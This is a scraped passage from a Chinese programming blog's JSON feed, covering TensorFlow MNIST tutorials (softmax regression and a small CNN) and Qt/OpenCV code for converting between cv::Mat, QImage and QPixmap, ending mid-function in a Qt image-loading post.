W是784x10矩阵（因为我们有784个输入特征和10个输出），b是10维向量（因为我们有10个数字）。 在会话中使用变量之前，必须使用该会话进行初始化变量。 这一步将已经指定的初始值（在这里，张量全零），分配给每个变量。 这可以一次完成所有变量的赋值： 1sess.run(tf.global_variables_initializer()) 预测类和损失函数我们现在可以实现我们的回归模型。 只需要一行！ 我们将向量化的输入图像x乘以权重矩阵W，加上偏差b。 1y = tf.matmul(x,W) + b 我们可以很容易地指定一个损失函数。 损失函数描述模型的预测值在一个例子上有多差; 在训练所有的例子时，我们尽量减少损失函数的值。 在这里，我们的损失函数是目标和应用于模型预测的softmax激活函数之间的交叉熵。 正如在初学者教程中，我们使用同样的公式： 12cross_entropy = tf.reduce_mean( tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=y)) 请注意，tf.nn.softmax_cross_entropy_with_logits在模型的非标准化模型预测中内部应用softmax，并在所有类中进行求和，tf.reduce_mean取这些和的平均值。 训练模型现在我们已经定义了我们的模型和训练损失函数，接下来使用TensorFlow进行训练是很简单的。 由于TensorFlow知道整个计算图，因此可以使用自动微分来查找相对于每个变量的损失的梯度。 TensorFlow有多种内置的优化算法。 对于这个例子，我们将使用最陡的梯度下降，步长为0.5，降低交叉熵。 1train_step = tf.train.GradientDescentOptimizer(0.5).minimize(cross_entropy) TensorFlow在这一行中实际上是在计算图中添加新的操作。 这些操作包括计算梯度、计算参数、更新步骤以及将更新步骤应用于参数。 运行train_step时返回的参数会用于更新梯度下降。 因此，训练模型可以通过重复运行train_step来完成。 123for _ in range(1000): batch = mnist.train.next_batch(100) train_step.run(feed_dict=&#123;x: batch[0], y_: batch[1]&#125;) 我们在每次训练迭代中加载100个训练样例。 然后我们运行train_step操作，使用feed_dict将训练样例中的占位符张量x和y_替换。 请注意，您可以使用feed_dict来替换计算图中的任何张量 - 它不仅限于占位符。 评估模型我们的模型有多好？ 首先我们要弄清楚我们在哪里预测了正确的标签。 tf.argmax是一个非常有用的函数，它可以为您提供某个轴上张量的最大输入索引。 例如，tf.argmax(y，1)是我们模型认为对每个输入最有可能的标签，而tf.argmax(y_，1)是真正的标签。 我们可以使用tf.equal来检查我们的预测是否符合事实。 1correct_prediction = tf.equal(tf.argmax(y,1), tf.argmax(y_,1)) 这里给出一个真值表。 为了确定什么分数是正确的，我们将布尔值转换为浮点数，然后取平均值。 例如，[True，False，True，True]将变成[1,0,1,1]，这将变为0.75。 1accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32)) 最后，我们可以评估我们的测试数据的准确性。 这里应该是大约92％的准确率。 1print(accuracy.eval(feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels&#125;)) #构建一个多层卷积网络 在MNIST上获得92％的准确性是不好的。 这几乎是令人尴尬的坏事。 在这一节中，我们将解决这个问题，从一个非常简单的模型跳到一些中等复杂的问题：一个小的卷积神经网络。 这将使我们达到约99.2％的准确性 - 不是最先进的，但是值得学习。 下面是一个用TensorBoard创建的关于我们将要构建的模型的图表： 权重初始化要创建这个模型，我们需要创建很多权重和偏差。 一般应该用少量的噪声初始化权重，以防止对称性破坏，并防止0梯度。 由于我们使用的是ReLU神经元，为了避免“死神经元”，初始化这些神经元是一个很好的做法。 在我们构建模型的时候不要重复这样的操作，而是创建两个函数来为我们做这件事。 1234567def weight_variable(shape): initial = tf.truncated_normal(shape, stddev=0.1) return tf.Variable(initial)def bias_variable(shape): initial = tf.constant(0.1, shape=shape) return tf.Variable(initial) 卷积和池化TensorFlow也为卷积和池化操作提供了很大的灵活性。 我们如何处理边界？ 我们的步幅是多少？ 在这个例子中，我们选择vanilla版本。 我们使步幅大小为1，并在周围填充零，以便输出与输入大小相同。 我们的pooling是超过2x2的max pooling。 为了保证我们的代码更清晰，我们也将这些操作抽象为函数。 123456def conv2d(x, W): return tf.nn.conv2d(x, W, strides=[1, 1, 1, 1], padding='SAME')def max_pool_2x2(x): return tf.nn.max_pool(x, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') tf.nn.conv2d 123456789conv2d( input, filter, strides, padding, use_cudnn_on_gpu=True, data_format='NHWC', name=None) input：张量。必须是以下类型之一：half，float32。一个四维张量。维度顺序根据data_format的值来解释，详见下文。 filter：张量。必须具有与输入相同的类型。形状的四维张量[filter_height，filter_width，in_channels，out_channels] strides：整数列表。一维长度的张量4.输入每个维度的滑动窗口的步幅。维度顺序由data_format的值决定，详见下文。 padding：来自“SAME”，“VALID”的字符串。要使用的填充算法的类型。 use_cudnn_on_gpu：一个可选的布尔。默认为True。 data_format：来自“NHWC”，“NCHW”的可选字符串。默认为“NHWC”。指定输入和输出数据的数据格式。使用默认格式“NHWC”，数据按照[batch，height，width，channels]的顺序存储。或者，格式可以是“NCHW”，数据存储顺序为：[batch，channels，height，width]。 name：操作的名称（可选）。 tf.nn.max_pool 12345678max_pool( value, ksize, strides, padding, data_format='NHWC', name=None) value：由data_format指定的格式的4维张量。 ksize：4元素的1维 int型张量。 输入张量表示窗口每个维度的大小。 strides：4元素的1维int型张量。 输入张量表示滑动窗口每个维度的步幅。 padding：一个字符串，可以是’VALID’ 或 ‘SAME’。 data_format：一个字符串。 支持“NHWC”，“NCHW”和“NCHW_VECT_C”。 name：操作的可选名称。 第一卷积层我们现在可以实现我们的第一层。 它将由卷积组成，然后是max pooling。 卷积将为每个5x5 patch计算32个特征。 它的权重张量是[5,5,1,32]的形状。 前两个维度是patch大小，下一个是输入通道的数量，最后一个是输出通道的数量。 每个输出通道还会有带有一个偏差向量的分量。 12W_conv1 = weight_variable([5, 5, 1, 32])b_conv1 = bias_variable([32]) 为了应用该层，我们首先将x重塑为4维张量，第二维和第三维对应于图像的宽度和高度，并且最后一个维度对应于色彩通道的数量。 1x_image = tf.reshape(x, [-1, 28, 28, 1]) 然后，我们将x_image与权重张量进行卷积，加上偏差，应用ReLU函数，最后使用max pooling。 max_pool_2x2方法将图像大小减小到14x14。 12h_conv1 = tf.nn.relu(conv2d(x_image, W_conv1) + b_conv1)h_pool1 = max_pool_2x2(h_conv1) 第二卷积层为了建立一个深层网络，我们堆叠了这种类型的几个层。 第二层将为每个5x5 patch有64个特征。 12345W_conv2 = weight_variable([5, 5, 32, 64])b_conv2 = bias_variable([64])h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)h_pool2 = max_pool_2x2(h_conv2) 密集连接层现在图像尺寸已经减小到7x7，我们添加了一个1024个神经元的全连接图层，以允许在整个图像上进行处理。 我们将pooling层中的张量重塑为一批向量，乘以权重矩阵，添加一个偏差，并应用一个ReLU。 12345W_fc1 = weight_variable([7 * 7 * 64, 1024])b_fc1 = bias_variable([1024])h_pool2_flat = tf.reshape(h_pool2, [-1, 7*7*64])h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1) Dropout为了减少过拟合，我们将在读出层之前应用dropout。 我们创建一个占位符，用于在dropout期间保持神经元输出的概率。 这可以让我们在训练过程中关闭dropout，并在测试过程中将其关闭。 TensorFlow的tf.nn.dropout可以自动处理缩放神经元输出和掩蔽它们，所以dropout只是在没有任何附加缩放的情况下工作。（对于这个小卷积网络，性能实际上几乎是相同的，没有丢失。 dropout对于减少过拟合通常是非常有效的，但是是在训练非常大的神经网络。） 12keep_prob = tf.placeholder(tf.float32)h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob) tf.nn.dropout 1234567dropout( x, keep_prob, noise_shape=None, seed=None, name=None) x：浮点张量。 keep_prob：与x相同类型的张量。 每个元素被保留的概率。 noise_shape：int32类型的一维张量，表示随机生成的保留/丢弃标志。 seed：一个Python整数。 用于创建随机种子。 有关行为，请参阅tf.set_random_seed。 name：此操作的名称（可选）。 对于概率keep_prob，输出按1 / keep_prob放大的输入元素，否则输出0。 读出层最后，我们添加一个图层，就像上面的一层softmax回归一样。 1234W_fc2 = weight_variable([1024, 10])b_fc2 = bias_variable([10])y_conv = tf.matmul(h_fc1_drop, W_fc2) + b_fc2 训练和评估模型这个模型有多好？ 为了训练和评估，我们将使用与上述简单的一层SoftMax网络几乎相同的代码。 不同之处在于： 我们将用更复杂的ADAM优化器替代最陡的梯度下降优化器。 我们将在feed_dict中包含附加参数keep_prob来控制丢失率。 我们将在训练过程中每100次迭代添加一次记录。 我们也将使用tf.Session而不是tf.InteractiveSession。 这更好地分离了创建图（模型说明）的过程和评估图（模型拟合）的过程。 它通常使更清晰的代码。tf.Session是在一个块内创建的，所以一旦块退出，它就会被自动销毁。 运行这个代码。 请注意，它会进行20,000次训练迭代，可能需要一段时间（可能长达半小时），具体取决于您的处理器。 123456789101112131415161718cross_entropy = tf.reduce_mean( tf.nn.softmax_cross_entropy_with_logits(labels=y_, logits=y_conv))train_step = tf.train.AdamOptimizer(1e-4).minimize(cross_entropy)correct_prediction = tf.equal(tf.argmax(y_conv, 1), tf.argmax(y_, 1))accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))with tf.Session() as sess: sess.run(tf.global_variables_initializer()) for i in range(20000): batch = mnist.train.next_batch(50) if i % 100 == 0: train_accuracy = accuracy.eval(feed_dict=&#123; x: batch[0], y_: batch[1], keep_prob: 1.0&#125;) print('step %d, training accuracy %g' % (i, train_accuracy)) train_step.run(feed_dict=&#123;x: batch[0], y_: batch[1], keep_prob: 0.5&#125;) print('test accuracy %g' % accuracy.eval(feed_dict=&#123; x: mnist.test.images, y_: mnist.test.labels, keep_prob: 1.0&#125;)) 运行此代码后的最终测试集精度应该约为99.2％。 我们已经学会了如何使用TensorFlow快速，轻松地构建，训练和评估相当复杂的深度学习模型。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"MNIST","slug":"MNIST","permalink":"http://coordinate.wang/tags/MNIST/"}]},{"title":"Tensorflow学习始于MNIST","slug":"2017-12-02-MNIST对于机器学习的初学者","date":"2017-12-01T16:00:00.000Z","updated":"2018-02-18T03:29:07.554Z","comments":true,"path":"2017/12/02/2017-12-02-MNIST对于机器学习的初学者/","link":"","permalink":"http://coordinate.wang/2017/12/02/2017-12-02-MNIST对于机器学习的初学者/","excerpt":"","text":"本教程面向刚学习机器学习和TensorFlow的读者。 如果您已经知道MNIST是什么，以及softmax（multinomial logistic）回归是什么，那么您可能更喜欢这个速度更快的教程。 确保在开始任何教程之前安装TensorFlow。 当学习如何编程时，首先要做的就是打印“Hello World”。 类似于编程中的Hello World，机器学习对应的是MNIST。 MNIST是一个简单的计算机视觉数据集。 它由这样的手写数字的图像组成： 它还包括每个图像的标签，告诉我们它是哪个数字。 例如，上述图像的标签是5,0,4和1。 在本教程中，我们将训练一个模型来查看图像并预测它们是什么数字。 我们的目标不是训练一个真正精细的模型来实现最先进的性能 - 尽管我们稍后会给您提供代码！ - 而是倾向于使用TensorFlow去实现它的。 因此，我们将从一个非常简单的模型开始，称之为Softmax回归。 本教程的实际代码非常短，所有有趣的内容都只发生在三行中。 然而，了解其背后的理念非常重要：TensorFlow的工作原理和核心机器学习概念。 正因为如此，我们要非常仔细的了解代码内部的细节。 关于本教程本教程是逐行解释mnist_softmax.py代码中做了什么的事情。 您可以通过几种不同的方式使用本教程，其中包括： 阅读每行的解释时，将每个代码段逐行复制并粘贴到Python环境中。 在阅读解释之前或之后运行整个mnist_softmax.py Python文件，并使用本教程来理解不清楚的代码行。 我们将在本教程中完成的任务： 了解MNIST数据和softmax回归 基于查看图像中的每个像素，创建一个识别数字的模型 使用TensorFlow来训练模型，通过让数字“看”数千个示例来识别数字（并运行我们的第一个TensorFlow会话来完成） 用我们的测试数据检查模型的准确性 MNIST数据MNIST数据在Yann LeCun的网站上托管。如果您正在复制和粘贴本教程中的代码，请从这两行代码开始，它们将自动下载并读取数据： 12from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets（“MNIST_data /”，one_hot = True） MNIST数据分为三个部分：55,000个训练数据（mnist.train）的数据点，10,000个测试数据（mnist.test），以及5,000个验证数据（mnist.validation）。这种分组是非常重要的：机器学习过程中必须要有不能学习到的独立数据，这样我们才能确保我们学到的东西实际上是泛化的！ 如前所述，每个MNIST数据点有两部分：一个手写数字的图像和一个相应的标签。我们将调用图像“x”和标签“y”。训练集和测试集都包含图像及其相应的标签;例如训练图像是mnist.train.images，训练标签是mnist.train.labels。 每个图像是28像素×28像素。我们可以把它解释为一大堆数字： 我们可以把这个数组变成一个28x28 = 784的数字。 只要我们在图像之间保持一致，那么我们如何展开阵列并不重要。 从这个角度来看，MNIST图像只是784维矢量空间中的一束点，具有非常丰富的结构（警告：计算密集的可视化）。 展平数据会丢弃有关图像二维结构的信息。这样不是不好吗？ 确实，最好的计算机视觉方法就是利用这个原有结构，我们将在后面的教程中这样去做。 但是这里我们将使用简单方法，softmax回归（下面定义）。 mnist.train.images的结果是一个形状为[55000，784]的张量（一个n维数组）。 第一维是图像列表的索引，第二维是每个图像中每个像素的索引。 张量中的每个条目是针对特定图像中的特定像素的介于0和1之间的像素强度。 MNIST中的每个图像都有相应的标签，0到9之间的数字代表图像中绘制的数字。 为了本教程的目的，我们将要我们的标签作为“one-hot vectors”。one-hot矢量是一个在多维度上为0，在单维度上为1的矢量。 在这种情况下，第n位将被表示为在第n维中为1的向量。 例如，3将是[0,0,0,1,0,0,0,0,0,0]。 因此，mnist.train.labels是一个[55000，10]的浮点数组。 我们现在开始制作我们的模型！ Softmax回归我们知道MNIST中的每个图像都是一个0到9之间的手写数字。所以一个给定的图像可能只有十种可能。我们希望能够看到一个图像，并给出它是每个数字的概率。例如，我们的模型可能会查看一张数字9的图片，并且有80％确定这是一张数字9的图片，但是给出一个5％的概率是因为它是一个8（因为上面弧形），并且有一些概率是其他数字，这不是100％确定。 这是一个softmax回归简单模型的一个经典案例。如果你想把一个对象的概率分配给几个不同的东西之一，softmax就是要做的事情，因为softmax给了我们一个0到1之间的值的列表，加起来就是1。在学习的后期，当我们训练更复杂的网络，最后一步将是softmax的一层。 softmax回归有两个步骤：首先我们将输入的特征加在某些类别中，然后将特征转换成概率。 为了收集给定图像在特定类别中的特征，我们进行像素强度的加权总和。如果具有高强度的像素是针对在该类别中的图像的特征，则权重是负的;如果特征是有利的，则权重是正的。 下图显示了一个模型在每个类中学习的权重。红色代表负面权重，蓝色代表正面权重。 我们还添加了一些额外的参数，称为bias。 基本上，我们希望有些东西能够更好的独立于输入。 结果是，热议一个输入x的类，得到的结果是： $evidence_i = \\sum_jW_i,_jx_j+b_i$ 其中Wi是权重，bi是类别i的偏差，j是对输入图像x中的像素求和的指数。 然后，我们使用“softmax”函数将特征数据转换成我们的预测概率y： $y = softmax(evidence)$ 这里softmax是作为一个“激活”或“链接”功能，塑造我们的线性函数的输出到我们想要的形式 - 在这种情况下，概率分布超过10个案例。 你可以把它看作是将特征转化为我们在每个类型中输入的概率。 它被定义为： $softmax(evidence) = normalize(exp(evidence))$ 如果你展开这个等式，你会得到： $softmax(evidence)_i = \\frac{exp(evidence_i)}{\\sum_jexp(evidence_j)}$ 但是，首先考虑softmax是更有帮助的：指数化输入，然后使其规格化。 指数意味着每多一个单位的特征将增加任何前向乘加的权重。 而相反，每少一个特征单位意味着每一个前向获得了上一层权重的一小部分。 没有前向的层为零或负权重。 Softmax然后归一化这些权重，使它们加起来为1，形成有效的概率分布。 （为了获得有关softmax函数的更多直觉，请查看Michael Nielsen书中的部分，并附带交互式可视化。） 你可以把我们的softmax回归看成如下所示，尽管有更多的xs。 对于每个输出，我们计算xs的加权总和，添加偏差，然后应用softmax。 如果我们把它写成等式，我们得到： 我们可以“矢量化”这个过程，把它变成矩阵乘法和矢量加法。 这对于计算效率是有帮助的。 （这也是一个有用的思考方式。） 更简洁，我们可以写： $y = softmax(Wx + b)$ 现在让我们把它转换成TensorFlow可以使用的东西。 实现回归为了在Python中进行高效的数值计算，我们通常使用像NumPy这样的库，这些库会执行复杂的操作，例如Python中的矩阵乘法，可以使用另一种语言实现的高效代码来完成。 不幸的是，每一次操作都会返回到Python，这仍然会有很多开销。 如果要在GPU上运行计算或以分布式方式运行计算，则传输数据的成本很高，所以此开销尤其糟糕。 TensorFlow也在Python之外进行繁重的工作，但是为了避免这种开销，还需要进一步的工作。 TensorFlow不是独立于Python运行的一个复杂操作，而是让我们描述一个完全在Python之外运行的交互操作图。 （像这样的方法可以在几个机器学习库中看到） 要使用TensorFlow，首先我们需要导入它。 1import tensorflow as tf 我们通过操纵符号变量来描述这些交互操作。 我们来创建一个： 1x = tf.placeholder(tf.float32, [None, 784]) x不是一个具体的值。 这是一个占位符，当我们要求TensorFlow运行一个计算时，我们会输入一个值。 我们希望能够输入任意数量的MNIST图像，每个图像被平面化成784维向量。 我们将其表示为浮点数的二维张量，其形状为[None，784]。 （这里None表示维度可以是任何长度。） 我们也需要我们的模型的权重和biases。 我们可以想象把这些看作是额外的输入，但是TensorFlow有一个更好的方法来处理它：Variable（变量）。 变量是一个可修改的张量，它存在于TensorFlow的交互操作图中。 它可以被使用，甚至被计算修改。 对于机器学习应用程序，通常将模型参数设置为变量。 12W = tf.Variable(tf.zeros([784, 10]))b = tf.Variable(tf.zeros([10])) 我们通过给定变量的初始值来创建这些变量：在这种情况下，我们将W和b初始化为全0的张量。 既然我们要学习W和b，它们最初是什么都没有关系。 注意到W的形状是[784，10]，因为我们想用它乘以784维的图像向量来产生差分类的特征的10维向量。 b的形状是[10]，所以我们可以将它添加到输出中。 我们现在可以实现我们的模型。 只需要一行来定义它！ 1y = tf.nn.softmax(tf.matmul(x, W) + b) 首先，我们乘以W乘以表达式tf.matmul（x，W）。这是从我们的方程中乘以它们的时候翻转过来的，这里我们把Wx作为一个小技巧来处理x是一个具有多个输入的2D张量。然后我们添加b，最后应用tf.nn.softmax。 而已。经过几行简单的设置之后，我们只用一条线来定义我们的模型。这并不是因为TensorFlow被设计成使得softmax回归特别容易：从机器学习模型到物理模拟，这只是描述多种数值计算的一种非常灵活的方式。一旦定义，我们的模型可以在不同的设备上运行：计算机的CPU，GPU，甚至是手机！ 训练为了训练我们的模型，我们需要定义模型的好坏。那么实际上，在机器学习中，我们通常定义一个模型的坏的意义。我们称之为成本或损失，它表示我们的模型离我们期望的结果有多远。我们尽量减少这个误差，误差越小，我们的模型就越好。 非常常见的，确定模型的损失函数被称为“交叉熵”。交叉熵来源于信息论中信息压缩编码的思想，但在赌博，机器学习等许多领域，都是一个重要的思想。它被定义为： $H_{y’}=-\\sum{y_i’log(y_i)}$ 其中y是我们预测的概率分布，y&#39;是真实分布（带有数字标签的one-hot矢量）。 在一些粗略的意义上，交叉熵是衡量我们的预测是多差的描述。 关于交叉熵的更多细节超出了本教程的范围，但是非常值得理解。 为了实现交叉熵，我们需要首先添加一个新的占位符来输入正确的答案： 1y_ = tf.placeholder(tf.float32, [None, 10]) 那么我们可以实现交叉熵函数， 1cross_entropy = tf.reduce_mean(-tf.reduce_sum(y_ * tf.log(y), reduction_indices=[1])) 首先，tf.log计算y的每个元素的对数。接下来，我们将y_的每个元素与tf.log（y）的相应元素相乘。然后，由于reduction_indices = [1]参数，tf.reduce_sum将元素添加到y的第二维中。最后，tf.reduce_mean计算批处理中所有示例的平均值。 请注意，在源代码中，我们不使用这个公式，因为它在数值上是不稳定的。相反，我们将tf.nn.softmax_cross_entropy_with_logits应用于非标准化的logits（例如，我们把tf.matmul(x，W)+ b）称为softmax_cross_entropy_with_logits，因为这个更稳定的数值函数在内部计算softmax激活。在您的代码中，请考虑使用tf.nn.softmax_cross_entropy_with_logits。 现在我们知道我们想要我们的模型做什么了，TensorFlow很容易训练它做到这一点。因为TensorFlow知道你计算的整个图表，它可以自动使用反向传播算法来有效地确定你的变量如何影响你要求它最小化的损失。然后它可以应用你选择的优化算法来修改变量并减少损失。 1train_step = tf.train.GradientDescentOptimizer(0.5).minimize(cross_entropy) 在这种情况下，我们要求TensorFlow使用学习率为0.5的梯度下降算法来最小化cross_entropy。 梯度下降是一个简单的过程，其中TensorFlow简单地将每个变量稍微向降低成本的方向移动一点。 同时TensorFlow还提供了许多其他优化算法。 实际上TensorFlow在幕后做的是添加新的操作到你的计算图，通过计算图来实现反向传播和梯度下降。 然后它给你一个单一的操作，运行时，做一步梯度下降训练，稍微调整你的变量，以减少损失。 我们现在可以在InteractiveSession中启动模型： 1sess = tf.InteractiveSession() 我们首先必须创建一个操作来初始化我们创建的变量： 1tf.global_variables_initializer().run() 让我们训练 - 我们将运行1000次的训练步骤！ 123for _ in range(1000): batch_xs, batch_ys = mnist.train.next_batch(100) sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;) 循环中的每一步，我们从我们的训练集中获得一百个随机数据点的“batch”。 我们运行train_step并且传回一个字典数据来替换占位符。 使用小批量的随机数据称为随机训练 - 在这里是随机梯度下降。 理想情况下，我们希望将所有数据用于每一步训练，因为这样可以让我们更好地了解我们应该做什么，但是这样做很复杂。 所以相反，我们每次都使用不同的子集。 这样做很简单，而且有很多相同的好处。 评估我们的模型怎么评价我们的模型有多好？ 那么，首先让我们弄清楚我们预测了多少正确的标签。tf.argmax是一个非常有用的函数，它可以为您提供某个轴上张量的最大输入索引。 例如，tf.argmax(y，1)是我们模型认为对每个输入最有可能的标签，而tf.argmax(y_，1)是正确的标签。 我们可以使用tf.equal来检查我们的预测是否符合事实。 1correct_prediction = tf.equal(tf.argmax(y,1), tf.argmax(y_,1)) 这给了我们一个真值表。 为了确定什么分数是正确的，我们转换为浮点数，然后取平均值。 例如，[True，False，True，True]将变成[1,0,1,1]，这将变为0.75。 1accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32)) 最后，我们打印出测试数据的准确性。 1print(sess.run(accuracy, feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels&#125;)) 这应该是大约92％。 这个数据怎么样？事实上很糟糕。 这是因为我们正在使用的是一个非常简单的模型。 通过一些小的改变，可以使我们准确率达到97％。 目前最好的模型可以达到超过99.7％的准确性！ （有关更多信息，请查看结果列表。）","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"tensorflow","slug":"tensorflow","permalink":"http://coordinate.wang/tags/tensorflow/"},{"name":"MNIST","slug":"MNIST","permalink":"http://coordinate.wang/tags/MNIST/"}]},{"title":"QT中的QImage、QPixmap和opencv 中的mat转化","slug":"2017-12-01-QT中的QImage、QPixmap和opencv 中的mat转化","date":"2017-11-30T16:00:00.000Z","updated":"2018-02-18T08:39:14.919Z","comments":true,"path":"2017/12/01/2017-12-01-QT中的QImage、QPixmap和opencv 中的mat转化/","link":"","permalink":"http://coordinate.wang/2017/12/01/2017-12-01-QT中的QImage、QPixmap和opencv 中的mat转化/","excerpt":"我们使用QT和opencv的过程中经常会碰到这样的问题：Mat怎么转化位QImage？Mat怎么转化为QPixmap？今天我来告诉大家一个比较好的解决方案（以下代码参考了别人的，增加了一些修改）","text":"我们使用QT和opencv的过程中经常会碰到这样的问题：Mat怎么转化位QImage？Mat怎么转化为QPixmap？今天我来告诉大家一个比较好的解决方案（以下代码参考了别人的，增加了一些修改） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#include &lt;QDebug&gt;#include &lt;QImage&gt;#include &lt;QPixmap&gt;#include \"opencv2/imgproc/imgproc.hpp\"#include \"opencv2/imgproc/types_c.h\"namespace CVS &#123;// 将Mat转化位QImageinline QImage cvMatToQImage( const cv::Mat &amp;inMat )&#123; switch ( inMat.type() ) &#123; // 8-bit, 4 channel case CV_8UC4: &#123; QImage image( inMat.data, inMat.cols, inMat.rows, static_cast&lt;int&gt;(inMat.step), QImage::Format_ARGB32 ); return image; &#125; // 8-bit, 3 channel case CV_8UC3: &#123; QImage image( inMat.data, inMat.cols, inMat.rows, static_cast&lt;int&gt;(inMat.step), QImage::Format_RGB888 ); return image.rgbSwapped(); &#125; // 8-bit, 1 channel case CV_8UC1: &#123;#if QT_VERSION &gt;= QT_VERSION_CHECK(5, 5, 0) QImage image( inMat.data, inMat.cols, inMat.rows, static_cast&lt;int&gt;(inMat.step), QImage::Format_Grayscale8 );//Format_Alpha8 and Format_Grayscale8 were added in Qt 5.5#else//这里还有一种写法，最后给出 static QVector&lt;QRgb&gt; sColorTable; // only create our color table the first time if ( sColorTable.isEmpty() ) &#123; sColorTable.resize( 256 ); for ( int i = 0; i &lt; 256; ++i ) &#123; sColorTable[i] = qRgb( i, i, i ); &#125; &#125; QImage image( inMat.data, inMat.cols, inMat.rows, static_cast&lt;int&gt;(inMat.step), QImage::Format_Indexed8 ); image.setColorTable( sColorTable );#endif return image; &#125; default: qWarning() &lt;&lt; \"CVS::cvMatToQImage() - cv::Mat image type not handled in switch:\" &lt;&lt; inMat.type(); break; &#125; return QImage();&#125;//将Mat转化为QPixmapinline QPixmap cvMatToQPixmap( const cv::Mat &amp;inMat )&#123; return QPixmap::fromImage( cvMatToQImage( inMat ) );&#125;//将QImage转化为Matinline cv::Mat QImageToCvMat( const QImage &amp;inImage, bool inCloneImageData = true )&#123; switch ( inImage.format() ) &#123; // 8-bit, 4 channel case QImage::Format_ARGB32: case QImage::Format_ARGB32_Premultiplied: &#123; cv::Mat mat( inImage.height(), inImage.width(), CV_8UC4, const_cast&lt;uchar*&gt;(inImage.bits()), static_cast&lt;size_t&gt;(inImage.bytesPerLine()) ); return (inCloneImageData ? mat.clone() : mat); &#125; // 8-bit, 3 channel case QImage::Format_RGB32: case QImage::Format_RGB888: &#123; if ( !inCloneImageData ) &#123; qWarning() &lt;&lt; \"CVS::QImageToCvMat() - Conversion requires cloning because we use a temporary QImage\"; &#125; QImage swapped = inImage; if ( inImage.format() == QImage::Format_RGB32 ) &#123; swapped = swapped.convertToFormat( QImage::Format_RGB888 ); &#125; swapped = swapped.rgbSwapped(); return cv::Mat( swapped.height(), swapped.width(), CV_8UC3, const_cast&lt;uchar*&gt;(swapped.bits()), static_cast&lt;size_t&gt;(swapped.bytesPerLine()) ).clone(); &#125; // 8-bit, 1 channel case QImage::Format_Indexed8: &#123; cv::Mat mat( inImage.height(), inImage.width(), CV_8UC1, const_cast&lt;uchar*&gt;(inImage.bits()), static_cast&lt;size_t&gt;(inImage.bytesPerLine()) ); return (inCloneImageData ? mat.clone() : mat); &#125; default: qWarning() &lt;&lt; \"CVS::QImageToCvMat() - QImage format not handled in switch:\" &lt;&lt; inImage.format(); break; &#125; return cv::Mat();&#125;//将QPixmap转化为Matinline cv::Mat QPixmapToCvMat( const QPixmap &amp;inPixmap, bool inCloneImageData = true )&#123; return QImageToCvMat( inPixmap.toImage(), inCloneImageData );&#125;&#125; 1234567891011121314151617//CV_8UC1另一种写法，不过我觉得上面的一种写法更优雅^_^QImage image(mat.cols, mat.rows, QImage::Format_Indexed8); // Set the color table (used to translate colour indexes to qRgb values) image.setColorCount(256); for(int i = 0; i &lt; 256; i++) &#123; image.setColor(i, qRgb(i, i, i)); &#125; // Copy input Mat uchar *pSrc = mat.data; for(int row = 0; row &lt; mat.rows; row ++) &#123; uchar *pDest = image.scanLine(row); memcpy(pDest, pSrc, mat.cols); pSrc += mat.step; &#125; return image; 新建一个头文件，将代码（CV_8UC1你自己挑一个吧）添加进去。 如何调用函数？在你要调函数的.cpp文件中添加using namespace CVS;即可。我推荐你这样去做CVS::函数。","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"},{"name":"qt","slug":"qt","permalink":"http://coordinate.wang/tags/qt/"}]},{"title":"QT5.9.1与opencv3.3读取图片（2）","slug":"2017-11-30-QT5.9.1与opencv3.3读取图片（2）","date":"2017-11-29T16:00:00.000Z","updated":"2018-02-18T08:39:39.410Z","comments":true,"path":"2017/11/30/2017-11-30-QT5.9.1与opencv3.3读取图片（2）/","link":"","permalink":"http://coordinate.wang/2017/11/30/2017-11-30-QT5.9.1与opencv3.3读取图片（2）/","excerpt":"我之前写过一篇QT5.9.1与opencv3.3读取图片，但是我们对于这种读取操作不是很满意，一般我们打开文件都是有一个对话框，并且图片是在一个小窗口中显示的。 关于如何新建一个项目，请看上一篇。 我们想要有一个小窗口去显示图片，那我们就要用到QMdiArea。从左边拖一个MDI Area到窗口中，点击MainWindow然后选择栅格布局。","text":"我之前写过一篇QT5.9.1与opencv3.3读取图片，但是我们对于这种读取操作不是很满意，一般我们打开文件都是有一个对话框，并且图片是在一个小窗口中显示的。 关于如何新建一个项目，请看上一篇。 我们想要有一个小窗口去显示图片，那我们就要用到QMdiArea。从左边拖一个MDI Area到窗口中，点击MainWindow然后选择栅格布局。 我们看到MDI Area的边界和MainWindow的边界有一些距离，这很难看，所以我们要调整这个间隔。选中centralWidget，然后修改LayoutLeftMargin、LayoutTopMargin、 LayoutRightMargin、LayoutBottomMargin 都设置为0。 接着我们要对小窗口进行设计，由于我们要显示一个图片，最简单的做法就是新建一个ChildWindow类，让这类继承QLabel类就可以了。 我们现在来处理ChildWindow类，其中用到了我们之前写的一个转换函数QT中的QImage、QPixmap和opencv 中的mat转化，我这里新建一个头文件qimageandmat.h，将上面文章中给的代码copy过去。 12345678910111213141516171819202122232425//childwindow.cpp//读取图片bool ChildWindow::loadFile(const QString &amp;fileName)&#123; 